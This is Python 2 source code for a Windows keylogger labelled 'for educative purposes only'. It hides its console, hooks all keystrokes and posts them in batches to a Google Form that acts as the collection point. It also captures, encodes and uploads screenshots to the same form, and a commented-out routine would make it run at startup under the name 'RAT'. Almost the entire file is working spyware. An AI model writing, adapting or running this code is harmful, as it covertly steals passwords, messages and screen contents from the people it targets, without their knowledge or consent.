# This application is for educative purposes only.
import Queue
import io
import threading

from PIL import Image

try:
    import pyHook
    import pythoncom
except:
    print "Please Install pythoncom and pyHook modules"
    exit(0)
import base64
import requests
import win32event, win32api, winerror
from PIL import ImageGrab

# Disallowing Multiple Instance
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)

data = ''
key_strokes_queue = Queue.Queue()

# Hide Console
def hide():
    import win32console, win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)


# Add to startup
# def addStartup():
#     fp = os.path.dirname(os.path.realpath(__file__))
#     file_name = sys.argv[0].split("\\")[-1]
#     new_file_path = fp + "\\" + file_name
#     keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
#
#     key2change = OpenKey(HKEY_CURRENT_USER,
#                          keyVal, 0, KEY_ALL_ACCESS)
#
#     SetValueEx(key2change, "RAT", 0, REG_SZ, new_file_path)


def remote_send():
    global key_strokes_queue
    if key_strokes_queue.empty():
        return

    data_to_be_sent = key_strokes_queue.get()

    url = "https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/formResponse"
    form_data = {'entry.1256060651': data_to_be_sent}
    user_agent = {
        'Referer': 'https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/viewform',
        'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"
    }
    requests.post(url, data=form_data, headers=user_agent, verify="cert.pem")
    # https://support.globalsign.com/customer/en/portal/articles/1464693-maximum-certificate-validity


# Remote Google Form logs post
def remote():
    global data
    if len(data) > 1000:
        print data
        key_strokes_queue.put(data)
        data = ''
        t = threading.Thread(target=remote_send)
        t.daemon = True
        t.start()
    return True


# data:image/png;base64,
def take_screenshot():
    buffer = io.BytesIO()

    img = ImageGrab.grab()
    print img.size
    img.thumbnail(tuple([.1 * x for x in img.size]), Image.ANTIALIAS)
    img.save("screenshot_1.jpg", "JPEG")
    img.save(buffer, "JPEG")
    img.close()

    print "Image saved"

    imgStr = base64.b64encode(buffer.getvalue())
    print imgStr
    print len(imgStr)

    url = "https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/formResponse"
    form_data = {'entry.1256060651': imgStr[:5000]}
    user_agent = {
        'Referer': 'https://docs.google.com/forms/d/1uau6h2gX7crd8q3j2dSFWFWfC5YxB_-ojnX3I0l466I/viewform',
        'User-Agent': "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36"}
    requests.post(url, data=form_data, headers=user_agent)

    # x = "qwertyui"
    # chunks, chunk_size = len(x), len(x) // 4
    # [x[i:i + chunk_size] for i in range(0, chunks, chunk_size)]
    # ['qw', 'er', 'ty', 'ui']
    # plt.imshow(img, cmap='gray', interpolation='bicubic')
    # plt.show()


def OnKeyboardEvent(event):
    if (event.Ascii > 31 and event.Ascii < 127) or event.Ascii == 13 or event.Ascii == 9:
        data = (event.WindowName, event.Window, event.Time, event.Ascii, event.Key, event.Alt)
        print data # debugging

def keypressed(event):
    global data
    # print dir(event)
    # print event.KeyID
    # if event.isAlt:
    #     data += "[Mayten Om Alt]"
    # else:
    print "Down:", event.Key
    # print event.GetMessageName
    # print event.GetKey
    # if event.Ascii == 13:
    #     keys = '<ENTER>'
    # elif event.Ascii == 8:
    #     keys = '<BACK SPACE>'
    # elif event.Ascii == 9:
    #     keys = '<TAB>'
    # else:
    #     try:
    #         keys = chr(event.Ascii)
    #     except:
    #         return
    data += "[%s]" % event.Key
    remote()


# def keyreleased(event):
#     global data
#
#     print "UP:", event.Key
#     data += "[^%s]" % event.Key
#     remote()

def main():
    hide()
    # take_screenshot()

    obj = pyHook.HookManager()
    obj.KeyDown = keypressed
    # obj.KeyDown = OnKeyboardEvent
    # obj.KeyUp = keyreleased
    # print dir(obj)
    obj.HookKeyboard()
    pythoncom.PumpMessages()

    # while True:
    #     try:
    #         while True:
    #             pythoncom.PumpWaitingMessages()
    #     except:
    #         pass

    # if len(sys.argv) > 2:
    #     if sys.argv[2] == "startup":
    #         addStartup()


if __name__ == '__main__':
    main()